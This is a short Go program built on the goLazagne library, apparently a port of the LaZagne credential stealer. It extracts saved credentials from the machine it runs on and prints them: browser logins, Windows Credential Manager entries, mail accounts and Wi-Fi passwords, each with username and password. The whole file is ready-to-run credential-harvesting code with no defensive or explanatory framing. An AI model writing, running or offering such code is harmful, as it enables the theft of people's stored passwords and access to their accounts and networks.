package main

import (
	"fmt"
	dreck "github.com/kerbyj/goLazagne"
	c "github.com/kerbyj/goLazagne/common"
)

func PrintShit(pp ...c.UrlNamePass) {
	for _, p := range pp {
		fmt.Printf("username: %s password: %s url: %s\n ", p.Username, p.Pass, p.Url)
	}
}
func PrintOtherShit(pp ...c.NamePass) {
	for _, p := range pp {
		fmt.Printf("username: %s password: %s\n", p.Name, p.Pass)
	}
}

func main() {
	creds, _ := dreck.ExtractAllData()
	PrintShit(creds.BrowserData...)
	PrintShit(creds.CredmanData...)
	PrintShit(creds.Mail...)
	PrintOtherShit(creds.WifiData...)
}
